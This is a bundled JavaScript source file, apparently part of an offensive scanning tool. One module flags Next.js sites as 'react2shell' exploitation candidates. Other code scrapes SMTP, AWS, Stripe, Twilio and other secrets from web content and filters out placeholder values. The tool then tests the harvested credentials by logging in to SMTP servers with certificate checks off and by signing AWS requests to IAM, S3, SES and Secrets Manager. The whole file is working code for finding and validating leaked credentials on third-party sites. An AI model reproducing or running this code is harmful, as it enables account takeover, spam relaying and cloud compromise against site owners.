      { name: "buildManifest", re: /_buildManifest(?:\.js)?["']?/ }
    ];
    VulnModule = class {
      name = "vuln";
      phase = "content";
      requiresPage = true;
      constructor(deps) {
        this.dedup = deps.dedup;
        this.config = deps.config;
        this.logger = deps.logger;
      }
      dedup;
      config;
      logger;
      isEnabled(config) {
        return config.modules.vuln !== false;
      }
      async *scan(ctx) {
        if (!ctx.pageContent) return;
        const markers = nextJsEvidence(ctx.pageContent);
        if (!markers.length) return;
        if (!this.dedup.checkAndMark("vuln-origin", ctx.origin)) return;
        const actionIds = extractNextActionIds(ctx.pageContent);
        this.logger.info(
          "VULN",
          `Next.js detected on ${ctx.origin} (${markers.join(", ")}) \u2014 react2shell candidate${actionIds.length ? ` (actionId ${actionIds[0]})` : ""}`
        );
        yield {
          source: "vuln",
          url: ctx.rawUrl,
          origin: ctx.origin,
          matches: [
            {
              service: "react2shell",
              value: ctx.origin,
              context: markers.join(", "),
              lineNumber: 0,
              patternName: "nextjs"
            }
          ],
          contentSnippet: markers.join(", "),
          ...actionIds.length ? { extra: { nextActionId: actionIds[0] ?? "" } } : {}
        };
      }
    };
    src_default5 = VulnModule;
  }
});

// packages/cli/src/index.ts
import { resolve as resolve4 } from "node:path";
import { setMaxListeners as setMaxListeners3 } from "node:events";

// packages/orchestrator/src/index.ts
init_src();
init_src2();

// packages/validator/src/index.ts
import { appendFileSync, mkdirSync, readFileSync as readFileSync2 } from "node:fs";
import { dirname } from "node:path";

// packages/validator/src/smtp-probe.ts
import { isIP as isIP2 } from "node:net";
import { connect as netConnect } from "node:net";
import { connect as tlsConnect } from "node:tls";
import { constants as cryptoConstants2 } from "node:crypto";
async function authenticateSmtp(opts) {
  const ports = opts.ports ?? smtpPortOrder(opts.preferredPort, opts.encryption);
  const errors = [];
  for (const port of ports) {
    const r = await authOnPort(opts.host, port, opts.user, opts.pass, opts.timeoutMs);
    if (r.kind === "ok") return { ok: true, port };
    if (r.kind === "auth") return { ok: false, kind: "auth", port, reply: r.reply };
    errors.push(r.error);
  }
  return { ok: false, kind: "connect", errors };
}
function smtpPortOrder(preferred, encryption) {
  const p = preferred > 0 && preferred < 65536 ? preferred : 587;
  const ssl = /ssl|smtps/i.test(encryption ?? "") || p === 465;
  const rest = ssl ? [465, p, 587, 25] : [p, 587, 465, 25];
  return [...new Set(rest.filter((x) => x > 0 && x < 65536))];
}
async function authOnPort(host, port, user, pass, timeoutMs) {
  const deadline = Date.now() + timeoutMs;
  let sock = null;
  try {
    sock = port === 465 ? await tlsDial(host, port, deadline) : await plainDial(host, port, deadline);
    const session = { sock, buf: "" };
    const banner = await readReply(session, deadline);
    if (banner.code !== 220) return { kind: "connect", error: `banner ${banner.code}` };
    let ehlo = await smtpCmd(session, `EHLO dreks.local`, deadline);
    if (ehlo.code >= 500) ehlo = await smtpCmd(session, `HELO dreks.local`, deadline);
    if (port !== 465 && /STARTTLS/i.test(ehlo.text)) {
      const st = await smtpCmd(session, "STARTTLS", deadline);
      if (st.code === 220) {
        sock = await tlsUpgrade(sock, host, deadline);
        session.sock = sock;
        session.buf = "";
        ehlo = await smtpCmd(session, `EHLO dreks.local`, deadline);
      }
    }
    const auth = await tryAuth(session, ehlo.text, user, pass, deadline);
    await smtpCmd(session, "QUIT", Math.min(deadline, Date.now() + 1500)).catch(() => void 0);
    return auth;
  } catch (err) {
    const msg = err.message || "i/o timeout";
    return { kind: "connect", error: `dial tcp ${host}:${port}: ${msg}` };
  } finally {
    sock?.destroy();
  }
}
async function tryAuth(session, ehlo, user, pass, deadline) {
  const methods = ehlo.toUpperCase();
  const loginOk = /AUTH[^\n]*LOGIN/.test(methods) || !/AUTH[^\n]*/.test(methods);
  const plainOk = /AUTH[^\n]*PLAIN/.test(methods);
  if (loginOk) {
    const r = await authLogin(session, user, pass, deadline);
    if (r) return r;
  }
  if (plainOk || !loginOk) {
    const r = await authPlain(session, user, pass, deadline);
    if (r) return r;
  }
  return { kind: "connect", error: "AUTH not advertised" };
}
async function authLogin(session, user, pass, deadline) {
  const start = await smtpCmd(session, "AUTH LOGIN", deadline);
  if (start.code === 503 || start.code === 504) return null;
  if (start.code === 530) return { kind: "connect", error: start.text.slice(0, 180) };
  if (start.code === 535 || start.code === 534) {
    return { kind: "auth", reply: start.text.slice(0, 180) };
  }
  if (start.code !== 334) return null;
  const u = await smtpCmd(session, Buffer.from(user, "utf8").toString("base64"), deadline);
  if (u.code === 535 || u.code === 534) return { kind: "auth", reply: u.text.slice(0, 180) };
  if (u.code !== 334) return { kind: "auth", reply: u.text.slice(0, 180) };
  const p = await smtpCmd(session, Buffer.from(pass, "utf8").toString("base64"), deadline);
  if (p.code === 235) return { kind: "ok" };
  if (p.code >= 500) return { kind: "auth", reply: p.text.slice(0, 180) };
  return { kind: "auth", reply: p.text.slice(0, 180) };
}
async function authPlain(session, user, pass, deadline) {
  const payload = Buffer.from(`\0${user}\0${pass}`, "utf8").toString("base64");
  const r = await smtpCmd(session, `AUTH PLAIN ${payload}`, deadline);
  if (r.code === 235) return { kind: "ok" };
  if (r.code === 504) return null;
  if (r.code >= 500) return { kind: "auth", reply: r.text.slice(0, 180) };
  return { kind: "auth", reply: r.text.slice(0, 180) };
}
async function smtpCmd(session, line, deadline) {
  session.sock.write(`${line}\r
`);
  return readReply(session, deadline);
}
async function readReply(session, deadline) {
  const lines = [];
  while (Date.now() < deadline) {
    if (!session.buf.includes("\n")) {
      session.buf += await readChunk(session.sock, deadline);
      continue;
    }
    const nl = session.buf.indexOf("\n");
    const line = session.buf.slice(0, nl).replace(/\r$/, "");
    session.buf = session.buf.slice(nl + 1);
    const m = line.match(/^(\d{3})([ -])(.*)$/);
    if (!m) continue;
    lines.push(m[3] ?? "");
    if (m[2] === " ") return { code: Number(m[1]), text: lines.join("\n") };
  }
  throw new Error("i/o timeout");
}
function readChunk(sock, deadline) {
  const ms = Math.max(1, deadline - Date.now());
  return new Promise((resolve5, reject) => {
    const timer = setTimeout(() => {
      cleanup();
      reject(new Error("i/o timeout"));
    }, ms);
    const onData = (buf) => {
      cleanup();
      resolve5(buf.toString("utf8"));
    };
    const onErr = (err) => {
      cleanup();
      reject(err);
    };
    const onEnd = () => {
      cleanup();
      reject(new Error("connection closed"));
    };
    const cleanup = () => {
      clearTimeout(timer);
      sock.off("data", onData);
      sock.off("error", onErr);
      sock.off("end", onEnd);
    };
    sock.once("data", onData);
    sock.once("error", onErr);
    sock.once("end", onEnd);
  });
}
function remaining(deadline) {
  return Math.max(1, deadline - Date.now());
}
function plainDial(host, port, deadline) {
  return new Promise((resolve5, reject) => {
    const sock = netConnect({ host, port });
    const timer = setTimeout(() => {
      sock.destroy();
      reject(new Error("i/o timeout"));
    }, remaining(deadline));
    sock.once("connect", () => {
      clearTimeout(timer);
      resolve5(sock);
    });
    sock.once("error", (err) => {
      clearTimeout(timer);
      sock.destroy();
      reject(new Error(err.code === "ECONNREFUSED" ? "connect: connection refused" : err.message || "i/o timeout"));
    });
  });
}
function tlsDial(host, port, deadline) {
  return new Promise((resolve5, reject) => {
    const sock = tlsConnect(tlsOpts(host, port));
    const timer = setTimeout(() => {
      sock.destroy();
      reject(new Error("i/o timeout"));
    }, remaining(deadline));
    sock.once("secureConnect", () => {
      clearTimeout(timer);
      resolve5(sock);
    });
    sock.once("error", (err) => {
      clearTimeout(timer);
      sock.destroy();
      reject(err);
    });
  });
}
function tlsUpgrade(socket, host, deadline) {
  return new Promise((resolve5, reject) => {
    const sock = tlsConnect(tlsOpts(host, void 0, socket));
    const timer = setTimeout(() => {
      sock.destroy();
      reject(new Error("i/o timeout"));
    }, remaining(deadline));
    sock.once("secureConnect", () => {
      clearTimeout(timer);
      resolve5(sock);
    });
    sock.once("error", (err) => {
      clearTimeout(timer);
      sock.destroy();
      reject(err);
    });
  });
}
function tlsOpts(host, port, socket) {
  const ip = isIP2(host) > 0;
  return {
    host,
    port,
    socket,
    minVersion: "TLSv1",
    rejectUnauthorized: false,
    servername: ip ? "" : host,
    secureOptions: cryptoConstants2.SSL_OP_LEGACY_SERVER_CONNECT
  };
}

// packages/validator/src/smtp-env.ts
init_src();
var SENDGRID_KEY = /^SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}$/;
var KEY_START = /\b(MAIL_[A-Z0-9_]+|SMTP_[A-Z0-9_]+|EMAIL_HOST(?:_USER|_PASSWORD)?|MAILER_[A-Z_]+|DEFAULT_FROM_EMAIL|SENDER_EMAIL|FROM_EMAIL|FROM_ADDRESS|NOREPLY_EMAIL|NO_REPLY_EMAIL|WP_MAIL_FROM|WORDPRESS_SMTP_FROM|EMAIL_FROM)\s*=[ \t]*/gi;
var ALIASES = {
  SMTP_HOST: "MAIL_HOST",
  SMTP_SERVER: "MAIL_HOST",
  EMAIL_HOST: "MAIL_HOST",
  MAILER_HOST: "MAIL_HOST",
  MAIL_SMTP_HOST: "MAIL_HOST",
  MAIL_SERVER: "MAIL_HOST",
  SMTP_PORT: "MAIL_PORT",
  EMAIL_PORT: "MAIL_PORT",
  SMTP_USERNAME: "MAIL_USERNAME",
  SMTP_USER: "MAIL_USERNAME",
  MAIL_USER: "MAIL_USERNAME",
  EMAIL_HOST_USER: "MAIL_USERNAME",
  SMTP_PASSWORD: "MAIL_PASSWORD",
  SMTP_PASS: "MAIL_PASSWORD",
  MAIL_PASS: "MAIL_PASSWORD",
  EMAIL_HOST_PASSWORD: "MAIL_PASSWORD",
  SMTP_ENCRYPTION: "MAIL_ENCRYPTION",
  MAIL_FROM: "MAIL_FROM_ADDRESS",
  MAIL_FROM_ADDR: "MAIL_FROM_ADDRESS",
  MAIL_FROM_EMAIL: "MAIL_FROM_ADDRESS",
  MAIL_SENDER: "MAIL_FROM_ADDRESS",
  MAIL_SEND_FROM: "MAIL_FROM_ADDRESS",
  SMTP_FROM_EMAIL: "MAIL_FROM_ADDRESS",
  SMTP_FROM: "MAIL_FROM_ADDRESS",
  SMTP_SENDER: "MAIL_FROM_ADDRESS",
  EMAIL_FROM: "MAIL_FROM_ADDRESS",
  DEFAULT_FROM_EMAIL: "MAIL_FROM_ADDRESS",
  SENDER_EMAIL: "MAIL_FROM_ADDRESS",
  FROM_EMAIL: "MAIL_FROM_ADDRESS",
  FROM_ADDRESS: "MAIL_FROM_ADDRESS",
  NOREPLY_EMAIL: "MAIL_FROM_ADDRESS",
  NO_REPLY_EMAIL: "MAIL_FROM_ADDRESS",
  WP_MAIL_FROM: "MAIL_FROM_ADDRESS",
  WORDPRESS_SMTP_FROM: "MAIL_FROM_ADDRESS",
  SMTP_FROM_NAME: "MAIL_FROM_NAME",
  MAIL_SENDER_NAME: "MAIL_FROM_NAME",
  EMAIL_FROM_NAME: "MAIL_FROM_NAME"
};
function isFullSendGridKey(value) {
  return SENDGRID_KEY.test(value.trim());
}
function canonicalMailKey(raw) {
  const key = raw.toUpperCase();
  return ALIASES[key] ?? key;
}
function parseMailAssignments(text) {
  const env = {};
  const blob2 = sanitizeMailBlob(text);
  KEY_START.lastIndex = 0;
  let m;
  while (m = KEY_START.exec(blob2)) {
    const canon = canonicalMailKey(m[1]);
    const start = m.index + m[0].length;
    const { value, consumed } = readMailValue(blob2, start, canon);
    KEY_START.lastIndex = start + Math.max(consumed, 1);
    if (value) env[canon] = preferMailValue(canon, env[canon], value);
  }
  if (env.MAIL_USERNAME) env.MAIL_USERNAME = cleanMailUser(env.MAIL_USERNAME);
  if (env.MAIL_FROM_ADDRESS) {
    const email = env.MAIL_FROM_ADDRESS.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/);
    if (email) env.MAIL_FROM_ADDRESS = email[0];
  }
  if (env.MAIL_ENCRYPTION && !/^(ssl|tls|starttls|none)$/i.test(env.MAIL_ENCRYPTION)) {
    delete env.MAIL_ENCRYPTION;
  }
  return env;
}
function sanitizeMailBlob(text) {
  return text.replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g, " ");
}
function cleanMailUser(user) {
  const first = user.trim().split(/\s+/)[0] ?? "";
  const glued = first.search(/(?:MAIL_|SMTP_|MAILER_|EMAIL_HOST)/);
  return (glued > 0 ? first.slice(0, glued) : first).trim();
}
function preferMailValue(key, current, next) {
  if (!next) return current ?? "";
  if (!current) return next;
  if (key === "MAIL_PASSWORD" || /PASS/i.test(key)) {
    if (next.startsWith(current) && next.length > current.length) return next;
    if (current.startsWith(next)) return current;
    return next.length > current.length ? next : current;
  }
  return current;
}
function readMailValue(text, start, key) {
  const rest = text.slice(start);
  if (!rest) return { value: "", consumed: 0 };
  const quote = rest[0];
  if (quote === '"' || quote === "'") {
    const end = rest.indexOf(quote, 1);
    if (end >= 0) return { value: rest.slice(1, end).trim(), consumed: end + 1 };
    const cut2 = nextAssignmentIndex(rest.slice(1));
    const raw = (cut2 >= 0 ? rest.slice(1, 1 + cut2) : rest.slice(1).split(/\r?\n/, 1)[0] ?? "").trim();
    return { value: raw, consumed: cut2 >= 0 ? 1 + cut2 : 1 + raw.length };
  }
  if (key === "MAIL_FROM_NAME") {
    if (/^(?:\r?\n|(?:MAIL_|SMTP_|EMAIL_HOST))/.test(rest)) {
      return { value: "", consumed: rest.startsWith("\r\n") ? 2 : rest.startsWith("\n") || rest.startsWith("\r") ? 1 : 0 };
    }
    const cut2 = rest.search(/\s+(?:MAIL_|SMTP_|EMAIL_HOST)|[\r\n;#]/);
    const value2 = (cut2 >= 0 ? rest.slice(0, cut2) : rest).trim();
    return { value: value2, consumed: cut2 >= 0 ? cut2 : rest.length };
  }
  if (/PASS/i.test(key)) {
    const grouped = rest.match(/^[A-Za-z0-9]{4}(?:[ \t]+[A-Za-z0-9]{4}){3}(?=[\s#;\r\n]|$)/);
    if (grouped) return { value: grouped[0].replace(/\s+/g, " ").trim(), consumed: grouped[0].length };
    const cut2 = nextAssignmentIndex(rest);
    const raw = cut2 >= 0 ? rest.slice(0, cut2) : rest.match(/^[^\s#;]+/)?.[0] ?? "";
    const split2 = cutGluedAssignment(raw.trim());
    return {
      value: split2.value,
      consumed: split2.gluedAt >= 0 ? split2.gluedAt : cut2 >= 0 ? cut2 : raw.length || 1
    };
  }
  const cut = nextAssignmentIndex(rest);
  let value = (cut >= 0 ? rest.slice(0, cut) : rest.match(/^[^\s#;]+/)?.[0] ?? "").trim();
  const split = cutGluedAssignment(value);
  value = split.value.split(/\s+/)[0] ?? "";
  return {
    value,
    consumed: split.gluedAt >= 0 ? split.gluedAt : cut >= 0 ? cut : rest.match(/^[^\s#;]+/)?.[0]?.length ?? 1
  };
}
function cutGluedAssignment(value) {
  const glued = value.search(/(?:MAIL_|SMTP_|EMAIL_HOST|MAILER_|LOG_EMAIL_)[A-Z0-9_]*=/);
  if (glued > 0) return { value: value.slice(0, glued), gluedAt: glued };
  return { value, gluedAt: -1 };
}
function nextAssignmentIndex(rest) {
  const cut = rest.search(/\s+[A-Z][A-Z0-9_]{2,64}=/);
  return cut;
}
function collectMailEnv(hit, match, siblings) {
  const blob2 = [hit.contentSnippet ?? "", match.context, ...siblings.map((s) => s.context)].join("\n");
  const env = parseMailAssignments(blob2);
  const all = [match, ...siblings].filter(
    (s) => s.service === "smtp" || s.service === "smtp.host" || s.service === "xsmtp" || s.service === "emailsmtp"
  );
  for (const s of all) {
    const name = canonicalMailKey(s.patternName);
    const value = firstToken(sanitizeMailBlob(s.value));
    if (!value) continue;
    if (!env.MAIL_HOST && (name === "MAIL_HOST" || /HOST|SERVER|RELAY/.test(name) || isHost(value))) {
      env.MAIL_HOST = value;
    } else if (!env.MAIL_USERNAME && (name === "MAIL_USERNAME" || /USER|LOGIN/.test(name) || value.includes("@"))) {
      env.MAIL_USERNAME = cleanMailUser(value);
    } else if (name === "MAIL_PASSWORD" || /PASS|SECRET/.test(name)) {
      env.MAIL_PASSWORD = preferMailValue("MAIL_PASSWORD", env.MAIL_PASSWORD, value);
    } else if (!env.MAIL_FROM_ADDRESS && /FROM/.test(name) && value.includes("@")) {
      env.MAIL_FROM_ADDRESS = value;
    } else if (!env.MAIL_PORT && /PORT/.test(name) && /^\d{2,5}$/.test(value)) {
      env.MAIL_PORT = value;
    }
  }
  if (!env.MAIL_PORT) env.MAIL_PORT = "587";
  if (!env.MAIL_ENCRYPTION) env.MAIL_ENCRYPTION = env.MAIL_PORT === "465" ? "ssl" : "tls";
  if (!env.MAIL_FROM_ADDRESS && env.MAIL_USERNAME?.includes("@") && !looksLikeJsSmtpValue(env.MAIL_USERNAME)) {
    env.MAIL_FROM_ADDRESS = env.MAIL_USERNAME;
  }
  return env;
}
function firstToken(v) {
  return v.trim().split(/\s+/)[0] ?? "";
}
function isHost(v) {
  return /^[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(v) && !v.includes("@");
}
function looksLikeJsSmtpValue(v) {
  const s = v.trim();
  if (!s) return true;
  if (JS_SMTP_JUNK.test(s)) return true;
  if (/\.env\./i.test(s)) return true;
  if (/^\(?n?\s*==null/.test(s) || /^\(n==null/.test(s)) return true;
  if (/[)}\]]{2,}/.test(s) && /[()]/.test(s)) return true;
  return false;
}
function isPlausibleMailHost(host) {
  if (!isHost(host) && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(host)) return false;
  if (PLACEHOLDER_HOST.test(host)) return false;
  if (looksLikeJsSmtpValue(host)) return false;
  if (FAKE_SMTP_TLD.test(host)) return false;
  return true;
}
function formatMailBlock(env) {
  const keys = [
    "MAIL_HOST",
    "MAIL_PORT",
    "MAIL_USERNAME",
    "MAIL_PASSWORD",
    "MAIL_ENCRYPTION",
    "MAIL_FROM_ADDRESS",
    "MAIL_FROM_NAME"
  ];
  const lines = [];
  for (const k of keys) {
    if (env[k]) lines.push(`${k}=${env[k]}`);
  }
  return lines.join("\n");
}
function smtpAccountKey(env) {
  const host = (env.MAIL_HOST ?? "").trim().toLowerCase();
  const user = (env.MAIL_USERNAME ?? "").trim();
  return `${host}:${user}`;
}
function shouldHoldSmtpInvalid(opts) {
  if (opts.alreadyValid || opts.alreadyNotifiedAccount) return "skip";
  if (!opts.alreadyDeferred && opts.otherPending > 1) return "defer";
  return "emit";
}
function smtpApiRoute(env) {
  const pass = env.MAIL_PASSWORD?.trim() ?? "";
  const host = (env.MAIL_HOST ?? "").toLowerCase();
  if (pass.startsWith("SG.")) return "sendgrid";
  if ((pass.startsWith("key-") || pass.startsWith("pubkey-")) && host.includes("mailgun")) return "mailgun";
  if (pass.startsWith("xkeysib-")) return "brevo";
  return null;
}
function smtpBrand(host) {
  const h = host.toLowerCase();
  if (h.includes("gmail") || h.includes("google")) return "\u{1F4E7} SMTP Gmail";
  if (h.includes("zoho")) return "\u{1F4E7} SMTP Zoho";
  if (h.includes("zeptomail")) return "\u{1F4E7} SMTP ZeptoMail";
  if (h.includes("outlook") || h.includes("office365") || h.includes("microsoft")) return "\u{1F4E7} SMTP Microsoft";
  if (h.includes("sendgrid")) return "\u{1F4E7} SMTP SendGrid";
  return "\u{1F4E7} SMTP G\xE9n\xE9rique";
}
var PLACEHOLDER_HOST = /^(localhost|127\.0\.0\.1|0\.0\.0\.0|::1)$|mail\.mailers\.smtp\.host|(^|\.)(smtp|mail)\.(example|provider|test|localhost)\.(com|org|net)$|\.example\.(com|org|net)$|mailhog|mailpit|mailcatcher|^smtp\.host$|^mail\.server$/i;
var JS_SMTP_JUNK = /\.optional\s*\(|\.min\s*\(\d+\)|\.email\s*\(|Yj\s*\(|\.pipe\s*\(|\.default\s*\(|\.coerce|z\.string|z\.literal|\.z\.string|process\.env|os\.environ|os\.getenv|getenv\s*\(|\$_ENV|System\.getenv|\.env\.(?:SMTP|MAIL|EMAIL)|SMTP_PASSWORD:|SMTP_FROM_|SMTP_HOST:|SMTP_PORT:|SMTP_AUTH_|smtp_pass:|poll_interval|\bparseInt\s*\(|\bString\s*\(|\.type===|==null|\?void|void\s*0/i;
var FAKE_SMTP_TLD = /\.(smtp|mail|env|user|pass|password|host|username|string|value|target|type|current|length|props|state|form|input|event|optional|literal|interval)$/i;
var PLACEHOLDER_VALUE = /^(null|undefined|none|nil|changeme|change_me|changemeplease|password|secret|smtp_password|your-?password|your_password|xxxxx+|\*+|placeholder|insert_.*|replace_.*|common_?)$/i;
var PLACEHOLDER_USER = /^(null|undefined|none|username|user|mailer|your-?email@.*|user@example\.com|email@example\.com)$/i;
var TUTORIAL_SMTP = /your|example|dummy|placeholder|changeme|sample|insert|replace|generatedfrom|apppassword|gmailemail|username|password/i;
var DOCS_SMTP_URL = /\/posts\/|\/blog\/|\/tutorials?\/|\/docs\/|laravel|send-an-email|using-gmail|stackoverflow|medium\.com|dev\.to/i;
var API_SMTP_USER = /^(emailapikey|apikey)$/i;
function looksLikeTutorialToken(v) {
  const s = v.trim().replace(/^["']|["']$/g, "");
  if (!s) return true;
  if (API_SMTP_USER.test(s)) return false;
  if (PLACEHOLDER_VALUE.test(s) || PLACEHOLDER_USER.test(s)) return true;
  if (/^(COMMON|SAMPLE|DUMMY|DEFAULT)_[A-Z0-9_]*$/i.test(s)) return true;
  if (/=/.test(s) && /(?:MAIL_|SMTP_|EMAIL_|LOG_EMAIL_)/.test(s)) return true;
  if (/your[A-Z]/.test(s)) return true;
  if (/^your[-_]?/i.test(s) && !/@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(s)) return true;
  if (s.includes("@")) {
    return /@(?:example|test|localhost)\.(?:com|org|net)$/i.test(s);
  }
  if (TUTORIAL_SMTP.test(s) && /gmail|email|password|user|secret|token|example|dummy/i.test(s) && s.length < 64) {
    return true;
  }
  return false;
}
function isTutorialSmtpHit(hit) {
  const u = `${hit.url} ${hit.path ?? ""}`;
  if (hit.source === "recon" || hit.source === "homepage" || hit.source === "js") {
    if (DOCS_SMTP_URL.test(u)) return true;
  }
  return false;
}
function isUsableSmtp(env) {
  const host = (env.MAIL_HOST ?? "").trim();
  const user = (env.MAIL_USERNAME ?? "").trim();
  const pass = (env.MAIL_PASSWORD ?? "").trim();
  if (!host || !user || !pass) return false;
  if (pass.length < 4) return false;
  if (!isPlausibleMailHost(host)) return false;
  if (looksLikeJsSmtpValue(user) || looksLikeJsSmtpValue(pass)) return false;
  if (looksLikeTutorialToken(user) || looksLikeTutorialToken(pass)) return false;
  return true;
}
function isStripeSecret(v) {
  return /^(sk_|rk_)(live|test)_/.test(v.trim());
}
function smtpFamily(service) {
  const s = service.endsWith(".host") ? service.slice(0, -5) : service;
  return s === "smtp" || s === "xsmtp" || s === "emailsmtp";
}
function credentialFingerprints(hit) {
  const keys = /* @__PURE__ */ new Set();
  const dummy = hit.matches[0] ?? {
    service: "smtp",
    value: "",
    context: "",
    lineNumber: 0,
    patternName: ""
  };
  const env = collectMailEnv(hit, dummy, hit.matches);
  const route = smtpApiRoute(env);
  const byService = /* @__PURE__ */ new Map();
  for (const m of hit.matches) {
    const service = m.service.endsWith(".host") ? m.service.slice(0, -5) : m.service;
    const list = byService.get(service) ?? [];
    list.push(m);
    byService.set(service, list);
  }
  for (const [service, matches] of byService) {
    if (smtpFamily(service)) {
      if (isTutorialSmtpHit(hit)) continue;
      if (route === "sendgrid") {
        if (isFullSendGridKey(env.MAIL_PASSWORD ?? "")) keys.add(`sg:${env.MAIL_PASSWORD.trim()}`);
        continue;
      }
      if (route === "mailgun" && env.MAIL_PASSWORD) {
        keys.add(`mg:${env.MAIL_PASSWORD}`);
        continue;
      }
      if (route === "brevo" && env.MAIL_PASSWORD) {
        keys.add(`brevo:${env.MAIL_PASSWORD}`);
        continue;
      }
      if (env.MAIL_HOST && isUsableSmtp(env)) {
        keys.add(`smtp:${env.MAIL_HOST}:${env.MAIL_USERNAME ?? ""}:${env.MAIL_PASSWORD ?? ""}`);
      }
      continue;
    }
    if (service === "sendgrid") {
      for (const m of matches) {
        if (isFullSendGridKey(m.value)) keys.add(`sg:${m.value.trim()}`);
      }
      continue;
    }
    if (service === "aws") {
      const akia = matches.find((m) => isAwsAccessKey(m.value))?.value;
      const secret = matches.find((m) => isValidAwsSecretKey(m.value))?.value;
      if (akia && secret) keys.add(`aws:${akia}:${secret}`);
      continue;
    }
    if (service === "stripe") {
      for (const m of matches) {
        if (isStripeSecret(m.value)) keys.add(`stripe:${m.value.trim()}`);
      }
      continue;
    }
    if (service === "twilio") {
      const credsSid = matches.find((m) => /^AC[0-9a-fA-F]{32}$/.test(m.value))?.value;
      const credsTok = matches.find((m) => /^[0-9a-fA-F]{32}$/.test(m.value) && !/^AC/.test(m.value) && !/^SK/.test(m.value))?.value;
      const blobSid = (hit.contentSnippet ?? "").match(/\b(AC[0-9a-fA-F]{32})\b/)?.[1];
      const sid = credsSid || blobSid;
      const tok = credsTok;
      if (sid && tok) keys.add(`twilio:${sid}:${tok}`);
      continue;
    }
    for (const m of matches) {
      if (m.value) keys.add(`${service}:${m.value}`);
    }
  }
  if (route === "sendgrid" && isFullSendGridKey(env.MAIL_PASSWORD ?? "")) {
    keys.add(`sg:${env.MAIL_PASSWORD.trim()}`);
  }
  return [...keys];
}

// packages/validator/src/aws-handler.ts
init_src();

// packages/validator/src/aws-api.ts
import { createHash, createHmac } from "node:crypto";
var AWS_SES_REGIONS = [
  "us-east-1",
  "us-east-2",
  "us-west-1",
  "us-west-2",
  "eu-west-1",
  "eu-west-2",
  "eu-west-3",
  "eu-central-1",
  "eu-north-1",
  "ap-south-1",
  "ap-northeast-1",
  "ap-northeast-2",
  "ap-southeast-1",
  "ap-southeast-2",
  "ca-central-1",
  "sa-east-1"
];
var STS_REGIONS = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"];
function extractXml(body, tag) {
  const open = `<${tag}>`;
  const close = `</${tag}>`;
  const start = body.indexOf(open);
  if (start < 0) return "";
  const from = start + open.length;
  const end = body.indexOf(close, from);
  if (end < 0) return "";
  return body.slice(from, end);
}
function extractXmlList(body, tag) {
  const open = `<${tag}>`;
  const close = `</${tag}>`;
  const out = [];
  let rest = body;
  for (; ; ) {
    const start = rest.indexOf(open);
    if (start < 0) break;
    const from = start + open.length;
    const end = rest.indexOf(close, from);
    if (end < 0) break;
    out.push(rest.slice(from, end));
    rest = rest.slice(end + close.length);
  }
  return out;
}
function sha256Hex(data) {
  return createHash("sha256").update(data).digest("hex");
}
function hmac(key, data) {
  return createHmac("sha256", key).update(data).digest();
}
function signingKey(secret, dateStamp, region, service) {
  return hmac(hmac(hmac(hmac(`AWS4${secret}`, dateStamp), region), service), "aws4_request");
}
function awsEndpoint(svc, region) {
  let signSvc = svc;
  let signRegion = region;
  let url;
  switch (svc) {
    case "iam":
      url = "https://iam.amazonaws.com/";
      signRegion = "us-east-1";
      break;
    case "email":
      url = `https://email.${region}.amazonaws.com/`;
      signSvc = "ses";
      break;
    case "sts":
      url = !region || region === "us-east-1" ? "https://sts.amazonaws.com/" : `https://sts.${region}.amazonaws.com/`;
      if (!region) signRegion = "us-east-1";
      break;
    default:
      url = `https://${svc}.${region}.amazonaws.com/`;
  }
  const host = new URL(url).host;
  return { url, signSvc, signRegion, host };
}
function signedHeaders(opts) {
  const now = /* @__PURE__ */ new Date();
  const amzDate = now.toISOString().replace(/[-:]/g, "").replace(/\.\d+Z$/, "Z");
  const dateStamp = amzDate.slice(0, 8);
  const payloadHash = sha256Hex(opts.body);
  const toSign = {
    host: opts.host,
    "x-amz-date": amzDate,
    "x-amz-content-sha256": payloadHash,
    ...opts.extra
  };
  const headerKeys = Object.keys(toSign).sort();
  const canonicalHeaders = headerKeys.map((k) => `${k}:${toSign[k].trim()}`).join("\n") + "\n";
  const signed = headerKeys.join(";");
  const canonical = [opts.method, opts.path || "/", opts.query, canonicalHeaders, signed, payloadHash].join("\n");
  const scope = `${dateStamp}/${opts.region}/${opts.service}/aws4_request`;
  const stringToSign = ["AWS4-HMAC-SHA256", amzDate, scope, sha256Hex(canonical)].join("\n");
  const signature = createHmac("sha256", signingKey(opts.secret, dateStamp, opts.region, opts.service)).update(stringToSign).digest("hex");
  return {
    authorization: `AWS4-HMAC-SHA256 Credential=${opts.access}/${scope}, SignedHeaders=${signed}, Signature=${signature}`,
    "x-amz-date": amzDate,
    "x-amz-content-sha256": payloadHash,
    ...Object.fromEntries(Object.entries(opts.extra).map(([k, v]) => [k, v]))
  };
}
async function awsQuery(http, svc, region, access, secret, params) {
  const ep = awsEndpoint(svc, region);
  const extra = { "content-type": "application/x-www-form-urlencoded" };
  const headers = signedHeaders({
    method: "POST",
    host: ep.host,
    path: "/",
    query: "",
    body: params,
    service: ep.signSvc,
    region: ep.signRegion,
    access,
    secret,
    extra
  });
  const res = await http.post(ep.url, {
    budget: "httpRequest",
    body: params,
    headers,
    maxBytes: 256 * 1024
  });
  return res.text;
}
async function awsS3List(http, access, secret) {
  const host = "s3.amazonaws.com";
  const headers = signedHeaders({
    method: "GET",
    host,
    path: "/",
    query: "",
    body: "",
    service: "s3",
    region: "us-east-1",
    access,
    secret,
    extra: {}
  });
  const res = await http.get("https://s3.amazonaws.com/", { budget: "httpRequest", headers, maxBytes: 256 * 1024 });
  return res.text;
}
async function awsJson(http, svc, region, target, access, secret, payload = "{}") {
  const host = `${svc}.${region}.amazonaws.com`;
  const contentType = svc === "secretsmanager" ? "application/x-amz-json-1.1" : "application/x-amz-json-1.0";
  const extra = { "content-type": contentType, "x-amz-target": target };
  const headers = signedHeaders({
    method: "POST",
    host,
    path: "/",
    query: "",
    body: payload,
    service: svc,
    region,
    access,
    secret,
    extra
  });
  const res = await http.post(`https://${host}/`, {
    budget: "httpRequest",
    body: payload,
    headers,
    maxBytes: 256 * 1024
  });
  return res.text;
}
function awsDenied(body) {
  return /AccessDenied|AuthFailure|UnauthorizedOperation|AuthorizationError|AccessDeniedException|UnrecognizedClientException/i.test(
    body
  );
}
